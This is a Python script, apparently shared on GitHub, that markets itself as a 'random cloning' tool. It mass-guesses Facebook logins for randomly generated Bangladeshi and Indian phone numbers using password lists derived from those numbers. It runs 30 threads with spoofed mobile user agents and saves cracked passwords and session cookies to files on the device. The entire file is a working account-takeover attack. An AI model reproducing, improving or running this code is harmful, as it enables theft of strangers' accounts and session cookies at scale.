"""
    @ open source by ---( Younis john )---
    @ Github : https://github.com/younis-dgk
    @ WhatsApp : +923194999455
    @ facebook : https://www.facebook.com/YounisDgk
    
"""
#----------------------■ IMPORT ■----------------------#
import os,requests,random
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
os.system('xdg-open https://www.youtube.com/@YounisXyz')
#----------------------■ MISSING MODEL ■----------------------#
try:
    import concurrent.futures
except ImportError:
    print(f'<■> Installing Futures ')
    time.sleep(0.5)
    os.system('pip install futures')
try: 
    import bs4
except ImportError:
    print('<■> Installing Bs4 ')
    time.sleep(0.5)
    os.system('pip install bs4')
#----------------------■ USER AGENT ■----------------------#
def uma():
    version=random.choice(["14","15","10","13","7.0.0","7.1.1","9","12","11","9.0","8.0.0","7.1.2","7.0","4","5","4.4.2","5.1.1","6.0.1","9.0.1"])
    model=random.choice(["RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993"])
    build = random.choice(['MMB29Q','R16NW','LRX22C','R16NW','KTU84P','JLS36C','NJH47F','PPR1.180610.011','QP1A.190711.020','NRD90M','RP1A.200720.012','M1AJB','MMB29T'])
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))
    return f'''Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36'''
#----------------------■ LOOP ■----------------------#
loop = 0;oks = [];cps = [];id = [];ck = []
#----------------------■ COLOUR ■----------------------#
wx='\x1b[1;97m';gx='\x1b[38;5;48m';bx='\x1b[38;5;8m';yx="\033[1;33m";px="\33[1;34m";rx='\x1b[38;5;196m'
#----------------------■ STYLE ■----------------------#
xd=f"{rx}<{wx}■{rx}>{gx}";xd1=f"{rx}<{wx}1{rx}>{gx}";xd2=f"{rx}<{wx}2{rx}>{gx}";xd3=f"{rx}<{wx}3{rx}>{gx}";xd4=f"{rx}<{wx}4{rx}>{gx}";xd5=f"{rx}<{wx}5{rx}>{gx}";xd0=f"{rx}<{wx}0{rx}>{gx}";xdx=f"{rx}<{wx}?{rx}>{gx}";xdxx=f"{rx}{wx}━➤{rx}{gx}"
#----------------------■ CLEAR ■----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{wx}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#----------------------■ LOGO ■----------------------#
logo = f"""{gx}
\n            {gx}____ _ _ _ ____ ____ \n            {gx}[__  | | | |__| | __ \n            {gx}___] |_|_| |  | |__]{wx} 0.2\n{wx}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{xd} OWNER {xdxx} NOT FOUND\n{xd} TOOLS {xdxx} RANDOM CLONING\n{wx}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#----------------------■ MENU ■----------------------#
def ____swag____():
	clear();print(f"{xd1} RANDOM CLONING");print(f"{xd0} EXIT CLONING ");linex();option=input(f"{xdx} SELECT {xdxx} ")
	if option in ["1"]:____random____()
	else:exit(f"{xd} KIRE KI SELECT KORLI KANKI MAGI ")
#----------------------■ RANDOM ■----------------------#
def ____random____():
	clear();print(f"{xd1} RANDOM {rx}<{wx}BANGLADESH{rx}>{gx} CLONING ");print(f"{xd2} RANDOM {rx}<{wx}INDIA{rx}>{gx} CLONING ");print(f"{xd0} EXIT CLONING");linex();option=input(f"{xdx} SELECT {xdxx} ")
	if option in ["1"]:____bangladesh____()
	if option in ["2"]:____India____()
	else:exit(f"{xd} KIRE KI SELECT KORLI KANKI MAGI ")
#----------------------■ RANDOM BANGLADESH ■----------------------#
def ____bangladesh____():
    user=[]
    ck=[]
    clear();print(f"{xd} EXAMPLE {xdxx} {rx}<{gx}017{rx}>{wx} {rx}<{gx}019{rx}>{wx} {rx}<{gx}016{rx}>{wx} {rx}<{gx}018{rx}>{wx}");linex();code = input(f"{xdx} SELECT  {xdxx} ");clear();print(f"{xd} EXAMPLE {xdxx} {rx}<{gx}3000{rx}>{wx} {rx}<{gx}5000{rx}>{wx} {rx}<{gx}9999{rx}>{wx} {rx}<{gx}99999{rx}>{wx}");linex();limit = int(input(f"{xdx} SELECT  {xdxx} "));clear();print(f"{xd} COOKIES SHOW {xdxx} {rx}<{gx}Y{xd}N{rx}>{wx}");linex();xmk = input(f"{xdx} SELECT {xdxx} ")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=8)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=30) as swagxxx:
        clear();tl = str(len(user))
        print(f"{xd} Uid {xd} Limit {xdxx} {rx}<{gx}{code}{rx}>{wx} {xd} {rx}<{gx}{limit}{rx}>{wx}");linex()
        for love in user:
            ids = code+love
            passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]]
            swagxxx.submit(____BAL____,ids,passlist,tl,ck)
    print("");linex();print(f'{xd} Cloning Has Been Complete');print(f'{xd} Total Ok Id {xdxx} {str(len(oks))}');print(f'{xd} Total Cp Id {xdxx} {str(len(cps))}');linex();exit()
#----------------------■ RANDOM INDIA ■----------------------#
def ____India____():
    user=[]
    ck=[]
    clear();print(f"{xd} EXAMPLE {xdxx} {rx}<{gx}+91639{rx}>{wx} {rx}<{gx}+91733{rx}>{wx} {rx}<{gx}+98272{rx}>{wx} {rx}<{gx}+92637{rx}>{wx}");linex();code = input(f"{xdx} SELECT  {xdxx} ");clear();print(f"{xd} EXAMPLE {xdxx} {rx}<{gx}3000{rx}>{wx} {rx}<{gx}5000{rx}>{wx} {rx}<{gx}9999{rx}>{wx} {rx}<{gx}99999{rx}>{wx}");linex();limit = int(input(f"{xdx} SELECT  {xdxx} "));clear();print(f"{xd} COOKIES SHOW {xdxx} {rx}<{gx}Y{xd}N{rx}>{wx}");linex();xmk = input(f"{xdx} SELECT {xdxx} ")
    for _ in range(limit):
        user.append("".join(random.choices(string.digits, k=7)))
    if xmk == "Y" or xmk == "y":
        ck.append("Y")
    elif xmk == "N" or xmk == "n":
        ck.append('N') 
    else:
        ck.append('N')
    with tred(max_workers=30) as swagxxx:
        clear();tl = str(len(user))
        print(f"{xd} Uid {xd} Limit {xdxx} {rx}<{gx}{code}{rx}>{wx} {xd} {rx}<{gx}{limit}{rx}>{wx}");linex()
        for love in user:
            ids = code+love
            passlist = [love,ids[:8],'57273200','59039200']
            swagxxx.submit(____BAL____,ids,passlist,tl,ck)
    print("");linex();print(f'{xd} Cloning Has Been Complete');print(f'{xd} Total Ok Id {xdxx} {str(len(oks))}');print(f'{xd} Total Cp Id {xdxx} {str(len(cps))}');linex();exit()
#----------------------■ RANDOM METHOD ■----------------------#
def ____BAL____(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r{rx}<{gx}SWAG-XD{rx}>{gx} {loop}{rx}|{gx}{len(oks)}{rx}|{gx}{len(cps)} "),
    sys.stdout.flush()
    session=requests.Session()
    ua = 'Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
    try:
        for pas in passlist:
            free_fb = session.get('https://free.facebook.com').text
            info={'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 'email': ids, 'login_source': 'comet_headerless_login', 'next': '', 'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={'User-Agent': uma(), 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://www.facebook.com/', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Alt-Used': 'www.facebook.com', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}
            session.post(url=f"https://www.facebook.com/login/",data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if "Y" in ck:
                        print(f'\r\r{rx}<{gx}SWAG-OK{rx}>{gx} {cid} {rx}|{gx} {pas}')
                        print(f'\r\r{rx}<{gx}MAGI-XX{rx}>{wx} {coki}');linex()
                        open('/sdcard/SWAG-RANDM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\r{rx}<{gx}SWAG-OK{rx}>{gx} {cid} {rx}|{gx} {pas}')
                        open('/sdcard/SWAG-RANDM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                print(f'\r\r{rx}<{yx}SWAG-OK{rx}>{yx} {cid} {rx}|{yx} {pas}')
                open('/sdcard/SWAG-RANDM-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(cid)
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#----------------------■ END ■----------------------#
____swag____()